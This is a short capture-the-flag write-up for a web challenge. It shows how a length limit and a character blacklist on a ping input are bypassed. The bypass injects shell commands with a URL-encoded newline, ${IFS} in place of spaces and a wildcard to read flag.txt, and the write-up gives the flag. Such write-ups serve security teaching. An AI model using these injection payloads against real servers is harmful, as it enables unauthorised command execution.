# Baby Web [428 Points]
*Solved By r0han*

You are given the source code in a main.go file and the hosted site.

## Solution

From Source code we know there there are two checks

1. Length cannot exceed 15 characters
2. Cannot contain !\"#%&'+,-/:;<=>?@[\\]^_`|~ 

We therefore need to find creative ways to get around this.
First we supply input as `0%0Als``
```
0 - Ping address 0 to end the ping command
%0A (new line character) - So we can start a new command much like how ; works. %0A is URL encoded hence escapes the checks and renders as 1 character length only
ls - To list files
```

This shows us that the current directory contains the file flag.txt. Now we need to craft the input to open the file.
To do this we inject the command `0%0Acat${IFS}fla*`
Let's break it down
```
0%0A - Mentioned earlier
cat  Open the file
${IFS} - separator since %20 for space doesnt work
fla* - * since we cannot have more than 15, use wildcard to match flag.txt, will work since only 1 file that start with fla
```

```
Flag: STANDCON{1nj3ct1On_@+_uR_c0MM@Nd}
```
